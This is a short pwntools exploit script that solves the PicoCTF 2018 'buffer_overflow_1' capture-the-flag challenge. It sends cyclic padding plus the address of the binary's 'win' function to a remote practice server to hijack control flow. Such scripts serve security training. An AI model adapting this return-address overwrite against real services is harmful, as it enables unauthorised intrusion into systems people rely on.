from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug') 
# io = process('PicoCTF_2018_buffer_overflow_1')
io = remote('node4.buuoj.cn', 28501)
elf = ELF('PicoCTF_2018_buffer_overflow_1')
win = elf.symbols['win']

payload = cyclic(0x2c) + p32(win)
io.sendlineafter('Please enter your string: \n', payload)
io.interactive()

